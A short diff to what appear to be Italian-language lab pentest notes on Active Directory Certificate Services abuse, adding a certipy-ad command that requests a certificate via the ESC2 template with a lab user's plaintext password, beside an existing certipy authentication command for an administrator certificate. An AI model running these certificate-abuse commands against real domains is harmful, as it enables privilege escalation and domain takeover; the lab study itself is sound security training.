@@ -229,9 +229,9 @@ certipy-ad auth -pfx administrator.pfx -dc-ip 192.168.56.12
 ```
 ![[Pasted image 20230828150041.png]]
 ### **ESC 2 - ADCS**
-
+Prendi il certificato usando certipy
 ```bash
-
+certipy-ad req -u khal.drogo@essos.local -p 'horse' -target 192.168.56.23 -template ESC2 -ca ESSOS-CA
 ```
 ### **ESC 3 - ADCS**
 ### **ESC 4 - ADCS**
